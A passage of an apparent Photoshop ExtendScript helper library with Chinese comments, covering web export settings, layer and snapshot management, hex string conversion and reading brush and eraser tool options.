      desc2.putBoolean(cTID('EICC'), false);//嵌入ICC配置文件
      desc2.putInteger(cTID('MttR'), 255);//杂边红
      desc2.putInteger(cTID('MttG'), 255);//杂边绿
      desc2.putInteger(cTID('MttB'), 255);//杂边蓝
      desc2.putUnitDouble(cTID('HScl'), cTID('#Prc'), longScale);//水平缩放比例
      desc2.putUnitDouble(cTID('VScl'), cTID('#Prc'), longScale);//垂直缩放比例
      desc2.putBoolean(cTID('SHTM'), false);//存储HTML文件
      desc2.putBoolean(cTID('SImg'), true);//存储图像文件
      desc2.putEnumerated(cTID('SWsl'), cTID('STsl'), cTID('SLAl'));//所有切片
      desc2.putEnumerated(cTID('SWch'), cTID('STch'), cTID('CHsR'));//转换为sRGB
      // desc2.putEnumerated(cTID('SWmd'), cTID('STmd'), cTID('MDCC'));//版权和联系信息
      // desc2.putBoolean(cTID('ohXH'), false);//输出XHTML
      // desc2.putBoolean(cTID('ohIC'), true);//包含注释
      // desc2.putBoolean(cTID('ohAA'), true);//总是添加Alt属性
      // desc2.putBoolean(cTID('ohQA'), true);//总是为属性加上引号
      // desc2.putBoolean(cTID('ohCA'), false);//结束所有标记
      // desc2.putBoolean(cTID('ohIZ'), true);//在正文标记中包含零边距
      // desc2.putEnumerated(cTID('ohTC'), cTID('SToc'), cTID('OC03'));//HTML标记大小写:小写
      // desc2.putEnumerated(cTID('ohAC'), cTID('SToc'), cTID('OC03'));//HTML属性大小写:小写
      // desc2.putInteger(cTID('ohIn'), -1);//HTML缩进
      // desc2.putEnumerated(cTID('ohLE'), cTID('STle'), cTID('LE03'));//HTML行结尾:自动
      // desc2.putEnumerated(cTID('ohEn'), cTID('STen'), cTID('EN00'));
      // desc2.putBoolean(cTID('olCS'), false);//生成CSS
      // desc2.putEnumerated(cTID('olEC'), cTID('STst'), cTID('ST00'));
      // desc2.putEnumerated(cTID('olWH'), cTID('STwh'), cTID('WH01'));
      // desc2.putEnumerated(cTID('olSV'), cTID('STsp'), cTID('SP04'));
      // desc2.putEnumerated(cTID('olSH'), cTID('STsp'), cTID('SP04'));
      // var list1 = new ActionList();
      // var desc3 = new ActionDescriptor();
      // desc3.putEnumerated(cTID('ncTp'), cTID('STnc'), cTID('NC00'));
      // list1.putObject(cTID('SCnc'), desc3);
      // var desc4 = new ActionDescriptor();
      // desc4.putEnumerated(cTID('ncTp'), cTID('STnc'), cTID('NC19'));
      // list1.putObject(cTID('SCnc'), desc4);
      // var desc5 = new ActionDescriptor();
      // desc5.putEnumerated(cTID('ncTp'), cTID('STnc'), cTID('NC28'));
      // list1.putObject(cTID('SCnc'), desc5);
      // var desc6 = new ActionDescriptor();
      // desc6.putEnumerated(cTID('ncTp'), cTID('STnc'), cTID('NC24'));
      // list1.putObject(cTID('SCnc'), desc6);
      // var desc7 = new ActionDescriptor();
      // desc7.putEnumerated(cTID('ncTp'), cTID('STnc'), cTID('NC24'));
      // list1.putObject(cTID('SCnc'), desc7);
      // var desc8 = new ActionDescriptor();
      // desc8.putEnumerated(cTID('ncTp'), cTID('STnc'), cTID('NC24'));
      // list1.putObject(cTID('SCnc'), desc8);
      // desc2.putList(cTID('olNC'), list1);
      // desc2.putBoolean(cTID('obIA'), false);//看作背景
      // desc2.putString(cTID('obIP'), "");
      // desc2.putEnumerated(cTID('obCS'), cTID('STcs'), cTID('CS01'));
      // var list2 = new ActionList();
      // var desc9 = new ActionDescriptor();
      // desc9.putEnumerated(cTID('ncTp'), cTID('STnc'), cTID('NC01'));
      // list2.putObject(cTID('SCnc'), desc9);
      // var desc10 = new ActionDescriptor();
      // desc10.putEnumerated(cTID('ncTp'), cTID('STnc'), cTID('NC20'));
      // list2.putObject(cTID('SCnc'), desc10);
      // var desc11 = new ActionDescriptor();
      // desc11.putEnumerated(cTID('ncTp'), cTID('STnc'), cTID('NC02'));
      // list2.putObject(cTID('SCnc'), desc11);
      // var desc12 = new ActionDescriptor();
      // desc12.putEnumerated(cTID('ncTp'), cTID('STnc'), cTID('NC19'));
      // list2.putObject(cTID('SCnc'), desc12);
      // var desc13 = new ActionDescriptor();
      // desc13.putEnumerated(cTID('ncTp'), cTID('STnc'), cTID('NC06'));
      // list2.putObject(cTID('SCnc'), desc13);
      // var desc14 = new ActionDescriptor();
      // desc14.putEnumerated(cTID('ncTp'), cTID('STnc'), cTID('NC24'));
      // list2.putObject(cTID('SCnc'), desc14);
      // var desc15 = new ActionDescriptor();
      // desc15.putEnumerated(cTID('ncTp'), cTID('STnc'), cTID('NC24'));
      // list2.putObject(cTID('SCnc'), desc15);
      // var desc16 = new ActionDescriptor();
      // desc16.putEnumerated(cTID('ncTp'), cTID('STnc'), cTID('NC24'));
      // list2.putObject(cTID('SCnc'), desc16);
      // var desc17 = new ActionDescriptor();
      // desc17.putEnumerated(cTID('ncTp'), cTID('STnc'), cTID('NC22'));
      // list2.putObject(cTID('SCnc'), desc17);
      // desc2.putList(cTID('ovNC'), list2);
      desc2.putBoolean(cTID('ovCM'), false);//Mac OS 9文件名兼容性
      desc2.putBoolean(cTID('ovCW'), true);//Windows文件名兼容性
      desc2.putBoolean(cTID('ovCU'), true);//Unix文件名兼容性
      desc2.putBoolean(cTID('ovSF'), false);//使用图像子文件夹
      desc2.putBoolean(cTID('ovCB'), true);//存储时拷贝背景图像
      // desc2.putString(cTID('ovSN'), "images");//图像子文件夹名
      desc1.putObject(cTID('Usng'), sTID("SaveForWeb"), desc2);
      app.executeAction(sTID('export'), desc1, DialogModes.NO);
      if (docDepth != 8) this.convertDepth(docDepth);
      return outPath.fsName;
    } catch (e) { return !1 }
  },
  mergeAllLayer: function () { //合并所有图层
    app.executeAction(1181512777, undefined, DialogModes.NO);
  },
  closeDoc: function (doc) { //关闭指定文档
    if (app.documents.length < 1) return !1;
    doc = doc || app.activeDocument;
    try { doc.close(SaveOptions.DONOTSAVECHANGES) } catch (e) { return !1 };
    return !0;
  },
  makeSnapshot: function (iName) { //建立快照
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putClass(cTID('SnpS'));
      desc1.putReference(cTID('null'), ref1);
      var ref2 = new ActionReference();
      ref2.putProperty(cTID('HstS'), cTID('CrnH'));
      desc1.putReference(cTID('From'), ref2);
      desc1.putString(cTID('Nm  '), iName);
      desc1.putEnumerated(cTID('Usng'), cTID('HstS'), cTID('FllD'));
      desc1.putBoolean(sTID("replaceExisting"), true);
      app.executeAction(sTID('make'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  selSnapshot: function (iName) { //选择快照
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putName(cTID('SnpS'), iName);
    desc1.putReference(cTID('null'), ref1);
    desc1.putBoolean(sTID("dontRecord"), true);
    app.executeAction(sTID('select'), desc1, DialogModes.NO);
  },
  setLayerName: function (iVal, iLayer) { //设置名称
    try {
      iLayer = iLayer || app.activeDocument.activeLayer;
      iLayer.name = iVal;
      return !0
    } catch (e) { return !1 }
  },
  setLayerNameByName: function (iName, iVal) { //通过图层名称设置名称
    var layer = this.getLayerByName(iName);
    if (layer != false) {
      layer.name = iVal;
      return !0
    } else return !1
  },
  setLayerOpacity: function (iVal, iLayer) { //设置图层透明度
    try {
      iLayer = iLayer || app.activeDocument.activeLayer;
      iLayer.opacity = iVal;
      return !0
    } catch (e) { return !1 }
  },
  getLayerOpacity: function (iLayer) { //获取图层透明度
    iLayer = iLayer || app.activeDocument.activeLayer;
    return Math.round(iLayer.opacity);
  },
  getLayerByName: function (iName) { //根据图层名称获取图层
    try { //外层
      return app.activeDocument.layers.getByName(iName)
    } catch (e) { //图层组
      function getByName(layerSets) {
        for (var i = 0; i < layerSets.length; i++) {
          try { return layerSets[i].layers.getByName(iName) } catch (e) { }
          return getByName(layerSets[i].layerSets);
        }
        return !1;
      }
      return getByName(app.activeDocument.layerSets);
    }
  },
  setLayerVisible: function (iVal, iLayer) { //设置图层可见度
    if (typeof (iLayer) == 'string') iLayer = this.getLayerByName(iLayer);
    iLayer = iLayer || app.activeDocument.activeLayer;
    iLayer.visible = iVal;
  },
  getFunLayer: function (arg) { //检测功能图层
    try {
      res = arg;
      if (app.documents.length < 1) res.status = !1;
      else res.status = this.getLayerByName(localize($.local[arg.funID])) != false
    } catch (e) { res.status = !1 }
    return JSON.stringify(res);
  },
  setFunOpacity: function (arg) { //设置功能图层不透明度和蒙板不透明度
    try {
      if (!app.documents.length) return;
      var iLayer = this.getLayerByName(localize($.local[arg.funID]));
      if (!iLayer) return !1;
      if (!iLayer.visible) iLayer.visible = !0;
      iLayer.opacity = arg.opacity;
      if (arg.maskOpacity !== undefined) try { iLayer.layerMaskDensity = 100 - arg.maskOpacity } catch (e) { }
      if (arg.skinOpacity !== undefined || arg.clothOpacity !== undefined || arg.hairOpacity !== undefined || arg.otherOpacity !== undefined) try {
        if (!this.selectLayerByName(localize($.local[arg.funID]), !0)) {
          this.makeMask();
          this.setMaskFeather(10);
        } else this.fillBK(!1);
        if (arg.skinOpacity !== undefined && this.loadSelection('$XT|Temp|funSkin')) this.fillBK(!0, 100 - arg.skinOpacity)
        if (arg.clothOpacity !== undefined && this.loadSelection('$XT|Temp|funClothe')) this.fillBK(!0, 100 - arg.clothOpacity)
        if (arg.hairOpacity !== undefined && this.loadSelection('$XT|Temp|maskHair')) this.fillBK(!0, 100 - arg.hairOpacity)
        if (arg.otherOpacity !== undefined && this.loadSelection('$XT|Temp|funOther')) this.fillBK(!0, 100 - arg.otherOpacity)
        this.deSelection();
        var meta = this.getLayerMetadata(iLayer);
        this.setLayerMetadata((typeof meta === 'object') ? assign(meta, arg) : arg, iLayer);
        // this.sendEvent({ type: 'AI仿色数据：', data: this.getLayerMetadata(iLayer) })
      } catch (e) { }
    } catch (e) { }
  },
  setLayerOpacityByName: function (iName, iVal) { //通过图层名称设置透明度
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putName(cTID('Lyr '), iName);
      desc1.putReference(cTID('null'), ref1);
      var desc2 = new ActionDescriptor();
      desc2.putUnitDouble(cTID('Opct'), cTID('#Prc'), iVal);
      desc1.putObject(cTID('T   '), cTID('Lyr '), desc2);
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  getLayerOpacityByName: function (iName) { //通过图层名称获取透明度
    try {
      var iLayer = this.getLayerByName(iName);
      return Math.round(iLayer.opacity);
    } catch (e) {
      return 0
    }
  },
  setLayerVisibleByName: function (iName, iVal) { //通过图层名称设置可见
    try {
      var iLayer = this.getLayerByName(iName);
      iLayer.visible = iVal;
      return !0;
    } catch (e) { return !1 }
  },
  getLayerVisibleByName: function (iName) { //通过图层名称获取可见
    try {
      var iLayer = this.getLayerByName(iName);
      return iLayer.visible;
    } catch (e) {
      return false
    }
  },
  setLayerVisibleByBackGround: function (iVal) { //背景层设置可见
    try {
      var doc = app.activeDocument;
      var iLayer = this.hasBackground() ? doc.backgroundLayer : doc.layers[doc.layers.length - 1];
      iLayer.visible = iVal;
      return !0;
    } catch (e) { return !1 }
  },
  deleteLayer: function (iLayer) { //删除指定图层
    try {
      iLayer = iLayer || app.activeDocument.activeLayer;
      iLayer.remove();
      return !0;
    } catch (e) { return !1 }
  },
  deleteHiddenLayer: function () { //删除隐藏图层
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), sTID("hidden"));
      desc1.putReference(cTID('null'), ref1);
      app.executeAction(sTID('delete'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  deleteLayerByName: function (iName) { //通过图层名称删除图层
    try {
      var iLayer = this.getLayerByName(iName);
      return iLayer.remove();
    } catch (e) { return !1 }
  },
  deleteLayers: function (iLayers) { //删除多个图层
    for (var i = 0; i < iLayers.length; i++) {
      try {
        this.deleteLayerByName(iLayers[i])
      } catch (e) { }
    }
  },
  compareEffect: function (firstIndex) { //对比效果
    try {
      if (!firstIndex) firstIndex = 0;
      if (firstIndex == 2) {
        var repairLayer = this.getLayerByName(localize($.local.repairLayer));
        if (repairLayer) {
          firstIndex = repairLayer.itemIndex - 1;
          try { var doc = app.activeDocument; if (doc.backgroundLayer && doc.layers.length == 2) firstIndex -= 1 } catch (e) { }
        } else firstIndex = 0;
      }
      if (firstIndex == 0) try { app.activeDocument.backgroundLayer } catch (e) { firstIndex = 1 }
      var desc1 = new ActionDescriptor();
      var list1 = new ActionList();
      var ref1 = new ActionReference();
      // ref1.putProperty(cTID('Lyr '), cTID('Bckg'));
      ref1.putIndex(cTID('Lyr '), firstIndex);
      list1.putReference(ref1);
      desc1.putList(cTID('null'), list1);
      desc1.putBoolean(cTID('TglO'), true);
      app.executeAction(sTID('show'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  compareLayer: function (layerName) { //对比图层
    try {
      var desc1 = new ActionDescriptor();
      var list1 = new ActionList();
      var ref1 = new ActionReference();
      if (layerName) ref1.putName(cTID('Lyr '), layerName);
      else ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
      list1.putReference(ref1);
      desc1.putList(cTID('null'), list1);
      desc1.putBoolean(cTID('TglO'), true);
      app.executeAction(sTID('show'), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  hist: function (dir) { //还原:previous/重做:next
    try {
      var desc = new ActionDescriptor();
      var ref = new ActionReference();
      if (!isNaN(dir)) ref.putOffset(cTID('HstS'), dir);
      else ref.putEnumerated(cTID("HstS"), cTID("Ordn"), sTID(dir));
      desc.putReference(cTID("null"), ref);
      // desc1.putBoolean(sTID("dontRecord"), true);
      // desc1.putBoolean(sTID("forceNotify"), false);
      app.executeAction(sTID("select"), desc, DialogModes.NO);
    } catch (e) { }
  },
  undo: function () { //返回
    try { app.executeAction(sTID('undoEvent'), undefined, DialogModes.NO) } catch (e) { }
  },
  newSnap: function (snapName) {
    try {
      this.delSnap(snapName);
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putClass(cTID('SnpS'));
      desc1.putReference(cTID('null'), ref1);
      var ref2 = new ActionReference();
      ref2.putProperty(cTID('HstS'), cTID('CrnH'));
      desc1.putReference(cTID('From'), ref2);
      desc1.putString(cTID('Nm  '), snapName);
      desc1.putEnumerated(cTID('Usng'), cTID('HstS'), cTID('FllD'));
      desc1.putBoolean(sTID('replaceExisting'), true);
      app.executeAction(sTID('make'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  selSnap: function (snapName) {
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putName(cTID('SnpS'), snapName);
      desc1.putReference(cTID('null'), ref1);
      app.executeAction(cTID('slct'), desc1, DialogModes.NO);
      return !0
    } catch (e) { return !1 }
  },
  hasSnap: function (snapName) {//是否有此快照
    try {
      var historyStates = app.activeDocument.historyStates;
      for (var n = 0; n < historyStates.length; n++) {
        if (historyStates[n].name == snapName) return !0;
      }
      return !1
    } catch (e) { return !1 }
  },
  delSnap: function (snapName) {
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putName(cTID('SnpS'), snapName);
      desc1.putReference(cTID('null'), ref1);
      app.executeAction(sTID('delete'), desc1, DialogModes.NO);
    } catch (e) { }
  },
  loadFile: function (file) { //载入动作
    // app.load(File(file));
    var desc = new ActionDescriptor();
    desc.putPath(sTID("target"), File(this.jsxFolder + file));
    app.executeAction(sTID("open"), desc);
  },
  delActionSet: function (actionSetName) { //删除动作集
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putName(cTID('ASet'), actionSetName);
    desc1.putReference(cTID('null'), ref1);
    app.executeAction(sTID('delete'), desc1, DialogModes.NO);
  },
  createTonelayer: function (layerName) { //创建颜色查找层
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putClass(cTID('AdjL'));
    desc1.putReference(cTID('null'), ref1);
    var desc2 = new ActionDescriptor();
    desc2.putString(cTID('Nm  '), layerName);
    desc2.putClass(cTID('Type'), sTID("colorLookup"));
    desc1.putObject(cTID('Usng'), cTID('AdjL'), desc2);
    app.executeAction(sTID('make'), desc1, DialogModes.NO);
  },
  runAction: function (actionSetName, actionName) { //运行动作
    var desc1 = new ActionDescriptor();
    var ref1 = new ActionReference();
    ref1.putName(cTID('Actn'), actionName);
    ref1.putName(cTID('ASet'), actionSetName);
    desc1.putReference(cTID('null'), ref1);
    app.executeAction(sTID('play'), desc1, DialogModes.NO);
  },
  desc2json: function (descToConvert) {
    var desc = new ActionDescriptor();
    desc.putObject(sTID("object"), sTID("object"), descToConvert);
    var resultDesc = app.executeAction(sTID("convertJSONdescriptor"), desc, DialogModes.NO);
    // return CryptoJS.enc.Utf8.parse(resultDesc.getString(sTID("json"))).toString();
    // return JSON.parse(resultDesc.getString(sTID("json")));
    return resultDesc.getString(sTID("json"));
  },
  json2desc: function (jsonSrc) {
    var desc = new ActionDescriptor();
    // desc.putString(sTID("json"), CryptoJS.enc.Utf8.stringify(CryptoJS.enc.Hex.parse(jsonSrc)));
    desc.putString(sTID("json"), jsonSrc);
    var resultDesc = app.executeAction(sTID("convertJSONdescriptor"), desc, DialogModes.NO);
    return resultDesc.getObjectValue(sTID("object"));
  },
  binToHex: function (s, whitespace) {
    function hexDigit(d) {
      if (d < 10) return d.toString();
      d -= 10;
      return String.fromCharCode('A'.charCodeAt(0) + d);
    }
    var str = '';
    for (var i = 0; i < s.length; i++) {
      if (i) {
        if (whitespace == true) {
          if (!(i & 0xf)) str += '\r\n';
          else if (!(i & 3)) str += ' ';
        }
      }
      var ch = s.charCodeAt(i) & 0xFF;  // check for unicode here...
      str += hexDigit(ch >> 4) + hexDigit(ch & 0xF);
    }
    return str;
  },
  hexToBin: function (h) {
    try {
      function binMap(n) {
        if (n.match(/[0-9]/)) return parseInt(n);
        return parseInt((n.charCodeAt(0) - 'A'.charCodeAt(0)) + 10);
      }

      h = h.toUpperCase().replace(/\s/g, '');
      var bytes = '';

      for (var i = 0; i < h.length / 2; i++) {
        var hi = h.charAt(i * 2);
        var lo = h.charAt(i * 2 + 1);
        var b = (binMap(hi) << 4) + binMap(lo);
        bytes += String.fromCharCode(b);
      }
      return bytes;
    } catch (e) { return null }
  },
  hexToStr: function (str) {
    var buf, s = '';
    for (var i = 0; i < str.length; i += 2) {
      buf = parseInt(str.substring(i, i + 2), 16);
      if (buf > 0) s += String.fromCharCode(buf);
    }
    return s
  },
  stringToHex: function (str) {//字符串转成十六进制
    var val = "";
    for (var i = 0; i < str.length; i++) {
      if (val == "") val = Number(str.charCodeAt(i)).toString(16);
      // else val += Number(str.charCodeAt(i)).toString(16);
      else val += "," + Number(str.charCodeAt(i)).toString(16);
    }
    return val;
  },
  hexToString: function (str) {//还原字符串
    var val = "";
    var arr = str.split(",");
    for (var i = 0; i < arr.length; i++) {
      val += String.fromCharCode(parseInt(arr[i], 16).toString(10));
    }
    return val;
  },
  getHueSaturationFX: function (iName) { //获取色相/饱和度
    var val = { hue: 0, saturation: 0, light: 0 };
    try {
      var ref1 = new ActionReference();
      ref1.putName(cTID('Lyr '), iName || app.activeDocument.activeLayer.name);
      var desc1 = app.executeActionGet(ref1);
      var desc2 = desc1.getObjectValue(sTID("smartObject")).getList(sTID('filterFX')).getObjectValue(0).getObjectValue(cTID("Fltr"));
      if (desc2.hasKey(cTID('Adjs'))) {
        var res = desc2.getList(cTID('Adjs')).getObjectValue(0);
        val.hue = res.getInteger(cTID('H   '));
        val.saturation = res.getInteger(cTID('Strt'));
        val.light = res.getInteger(cTID('Lght'));
      }
    } catch (e) { }
    return val;
  },
  setHueSaturationFX: function (arg) { //色相/饱和度
    var result = !1;
    arg = arg || {}
    if (!arg.hasOwnProperty('hue') || !arg.hasOwnProperty('saturation') || !arg.hasOwnProperty('light')) {
      var res = this.getHueSaturationFX();
      arg.hue = arg.hue || res.hue;
      arg.saturation = arg.saturation || res.saturation;
      arg.light = arg.light || res.light;
    }
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putIndex(sTID("filterFX"), 1);
      ref1.putEnumerated(cTID('Lyr '), cTID('Ordn'), cTID('Trgt'));
      desc1.putReference(cTID('null'), ref1);
      var desc2 = new ActionDescriptor();
      var desc3 = new ActionDescriptor();
      desc3.putEnumerated(sTID("presetKind"), sTID("presetKindType"), sTID("presetKindCustom"));
      desc3.putBoolean(cTID('Clrz'), false);
      var list1 = new ActionList();
      var desc4 = new ActionDescriptor();
      desc4.putInteger(cTID('H   '), arg.hue);
      desc4.putInteger(cTID('Strt'), arg.saturation);
      desc4.putInteger(cTID('Lght'), arg.light);
      list1.putObject(cTID('Hst2'), desc4);
      desc3.putList(cTID('Adjs'), list1);
      desc2.putObject(cTID('Fltr'), cTID('HStr'), desc3);
      desc1.putObject(sTID("filterFX"), sTID("filterFX"), desc2);
      app.executeAction(sTID('set'), desc1, DialogModes.NO);
      result = !0;
    } catch (e) { }
    return result;
  },
  moveTop: function () { //移到顶层
    this.moveStep('Frnt');
  },
  moveStep: function (stepStr) { //移位层
    //'Frnt':顶层，'Prvs':上一层，'Nxt ':下一层，'Back':底层
    try {
      var desc1 = new ActionDescriptor();
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID("Lyr "), cTID("Ordn"), cTID("Trgt"));
      desc1.putReference(cTID("null"), ref1);
      var ref2 = new ActionReference();
      ref2.putEnumerated(cTID("Lyr "), cTID("Ordn"), cTID(stepStr));
      desc1.putReference(cTID("T   "), ref2);
      app.executeAction(cTID("move"), desc1, DialogModes.NO);
      return !0;
    } catch (e) { return !1 }
  },
  isFunLayer: function (layerName) { //是否是主功能层
    return (layerName.substr(0, 4) == '$XT|' && layerName.substr(layerName.length - 1, 1) == '|')
  },
  getCurrentFunLayer: function () { //获取当前主功能层
    var currentLayer = app.activeDocument.activeLayer;
    while (true) {
      if (currentLayer.parent.typename == "Document") return currentLayer;
      else currentLayer = currentLayer.parent
    }
  },
  setLayerToolProperty: function (tool) { //设置工具属性
    try {
      switch (tool.name) {
        case "paintbrushTool":
          this.setPaintbrushTool(tool.prop);
          break;
        case "magicStampTool":
          this.setMagicStampTool(tool.prop);
          break;
        case "spotHealingBrushTool":
          this.setSpotHealingBrushTool(tool.prop);
          break;
        case "wetBrushTool":
          this.setWetBrushTool(tool.prop);
          break;
        case "moveTool":
          this.setMoveTool(tool.prop);
          break;
        case "eraserTool":
          this.setEraserTool(tool.prop);
          break;
      }
    } catch (e) { }
  },
  getToolName: function () { //获取当前工具名
    var r = new ActionReference();
    r.putProperty(sTID("property"), sTID("tool"));
    r.putEnumerated(sTID("application"), sTID("ordinal"), sTID("targetEnum"));
    return app.typeIDToStringID(app.executeActionGet(r).getEnumerationType(sTID("tool")));
  },
  getCurrentToolOptions: function (toolName) { //获取工具属性值
    var _this = this;
    var tool = app.currentTool;
    _getPaintbrushToolOptions = function () { //获取笔刷选项
      _this.selTool("paintbrushTool");
      var opt = {};
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID("capp"), cTID("Ordn"), cTID("Trgt"));
      var desc1 = app.executeActionGet(ref1);
      var toolOpt = desc1.getObjectValue(sTID('currentToolOptions'));
      var brush = toolOpt.getObjectValue(sTID('brush'));
      opt.Size = brush.getUnitDoubleValue(cTID('Dmtr')); //笔刷大小
      opt.Hardn = brush.getUnitDoubleValue(cTID('Hrdn')); //笔刷硬度
      opt.Angle = brush.getUnitDoubleValue(sTID('angle')); //笔刷角度
      opt.Opacity = toolOpt.getInteger(cTID('Opct')); //不透明度
      opt.Flow = toolOpt.getInteger(sTID('flow')); //流量
      opt.Smooth = toolOpt.getInteger(cTID('Smoo')); //平滑
      opt.smoothingValue = toolOpt.getDouble(sTID('smoothingValue')); //平滑流量
      opt.smoothing = toolOpt.getBoolean(sTID("smoothing")); //启用平滑
      opt.usePressureOverridesOpacity = toolOpt.getBoolean(sTID("usePressureOverridesOpacity")); //启用压力不透明度
      opt.usePressureOverridesSize = toolOpt.getBoolean(sTID("usePressureOverridesSize")); //启用压力大小
      opt.repeat = toolOpt.getBoolean(sTID("repeat")); //启用气刷
      opt.useTipDynamics = toolOpt.getBoolean(sTID("useTipDynamics")); //启用形状动态
      opt.usePaintDynamics = toolOpt.getBoolean(sTID("usePaintDynamics")); //启用传递
      // opt.useScatter = toolOpt.getBoolean(sTID("useScatter")); //启用散布
      opt.Mode = app.typeIDToStringID(toolOpt.getEnumerationValue(cTID('Md  ')));
      opt.Color = _this.getForegroundColor();
      if (tool != "paintbrushTool") _this.selTool(tool);
      return opt;
    }
    _getSpotHealingBrushToolOptions = function () { //获取污点修复画笔选项
      _this.selTool("spotHealingBrushTool");
      var opt = {};
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID("capp"), cTID("Ordn"), cTID("Trgt"));
      var desc1 = app.executeActionGet(ref1);
      var toolOpt = desc1.getObjectValue(sTID('currentToolOptions'));
      var brush = toolOpt.getObjectValue(sTID('brush'));

      // opt.Flow = toolOpt.getInteger(sTID('flow')); //流量
      opt.Mode = app.typeIDToStringID(toolOpt.getEnumerationValue(cTID('Md  '))); //模式
      // opt.Opacity = toolOpt.getInteger(cTID('Opct')); //不透明度
      opt.SmmS = app.typeIDToCharID(toolOpt.getEnumerationValue(cTID('SmmS'))); //类型
      opt.StmS = toolOpt.getBoolean(cTID("StmS")); //对所有图层取样
      opt.usePressureOverridesSize = toolOpt.getBoolean(sTID("usePressureOverridesSize")); //启用压力大小
      opt.healSmoothFactor = toolOpt.getInteger(sTID("healSmoothFactor")); //扩散

      opt.Size = brush.getUnitDoubleValue(cTID("Dmtr"));
      opt.Hardn = brush.getUnitDoubleValue(cTID("Hrdn"));
      opt.Angle = brush.getUnitDoubleValue(cTID("Angl"));
      opt.Roundness = brush.getUnitDoubleValue(cTID("Rndn"));
      opt.Space = brush.getUnitDoubleValue(cTID("Spcn"));
      // opt.Interpolation = brush.getBoolean(cTID("Intr"));

      if (tool != "spotHealingBrushTool") _this.selTool(tool);
      return opt;
    }
    _getMagicStampToolOptions = function () { //获取修复画笔选项
      _this.selTool("magicStampTool");
      var opt = {};
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID("capp"), cTID("Ordn"), cTID("Trgt"));
      var desc1 = app.executeActionGet(ref1);
      var toolOpt = desc1.getObjectValue(sTID('currentToolOptions'));
      var brush = toolOpt.getObjectValue(sTID('brush'));
      opt.Size = Math.round(brush.getUnitDoubleValue(cTID('Dmtr')));
      opt.Hardn = brush.getUnitDoubleValue(cTID('Hrdn'));
      opt.Space = brush.getUnitDoubleValue(cTID('Spcn'));
      opt.Angle = brush.getUnitDoubleValue(cTID('Angl'));
      opt.Roundness = brush.getUnitDoubleValue(cTID('Rndn'));
      opt.StmS = toolOpt.getBoolean(cTID('StmS'));
      opt.StmB = toolOpt.getBoolean(cTID('StmB'));
      opt.StmI = toolOpt.getBoolean(cTID('StmI'));
      opt.StmA = toolOpt.getBoolean(cTID('StmA'));
      opt.healSmoothFactor = toolOpt.getInteger(sTID('healSmoothFactor'));
      opt.Mode = app.typeIDToStringID(toolOpt.getEnumerationValue(cTID('Md  ')));
      if (tool != "magicStampTool") _this.selTool(tool);
      return opt;
    }
    _getWetBrushToolOptions = function () { //获取混合画笔选项
      _this.selTool("wetBrushTool");
      var opt = {};
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID("capp"), cTID("Ordn"), cTID("Trgt"));
      var desc1 = app.executeActionGet(ref1);
      var toolOpt = desc1.getObjectValue(sTID('currentToolOptions'));
      var brush = toolOpt.getObjectValue(sTID('brush'));
      opt.wetness = toolOpt.getUnitDoubleValue(sTID("wetness"));
      opt.mix = toolOpt.getUnitDoubleValue(sTID("mix"));
      opt.dryness = toolOpt.getUnitDoubleValue(sTID("dryness"));
      opt.flow = toolOpt.getUnitDoubleValue(sTID("flow"));
      opt.usePressureOverridesSize = toolOpt.getBoolean(sTID("usePressureOverridesSize"));
      opt.usePressureOverridesOpacity = toolOpt.getBoolean(sTID("usePressureOverridesOpacity"));
      opt.useLegacy = toolOpt.getBoolean(sTID("useLegacy"));
      opt.sampleAllLayers = toolOpt.getBoolean(sTID("sampleAllLayers"));
      opt.reservoirState = toolOpt.getInteger(sTID("reservoirState"));
      opt.autoFill = toolOpt.getBoolean(sTID("autoFill"));
      opt.loadSolidColorOnly = toolOpt.getBoolean(sTID("loadSolidColorOnly"));
      opt.autoClean = toolOpt.getBoolean(sTID("autoClean"));
      opt.autoClean = toolOpt.getBoolean(sTID("autoClean"));
      opt.autoClean = toolOpt.getBoolean(sTID("autoClean"));
      opt.diameter = brush.getUnitDoubleValue(cTID("Dmtr"));
      opt.hardness = brush.getUnitDoubleValue(cTID("Hrdn"));
      if (tool != "wetBrushTool") _this.selTool(tool);
      return opt;
    }
    _getEraserToolOptions = function () { //获取橡皮擦选项
      _this.selTool("eraserTool");
      var opt = {};
      var ref1 = new ActionReference();
      ref1.putEnumerated(cTID("capp"), cTID("Ordn"), cTID("Trgt"));
      var desc1 = app.executeActionGet(ref1);
      var toolOpt = desc1.getObjectValue(sTID('currentToolOptions'));
      opt.Opacity = toolOpt.getInteger(cTID('Opct')); //不透明度
      opt.Flow = toolOpt.getInteger(sTID('flow')); //流量
      opt.Smooth = toolOpt.getInteger(cTID('Smoo')); //平滑
      var brush = toolOpt.getObjectValue(cTID('Brsh'));
      opt.Size = brush.getUnitDoubleValue(cTID('Dmtr')); //笔刷大小
      opt.Hardn = brush.getUnitDoubleValue(cTID('Hrdn')); //笔刷硬度
      opt.usePressureOverridesOpacity = toolOpt.getBoolean(sTID("usePressureOverridesOpacity")); //启用压力不透明度
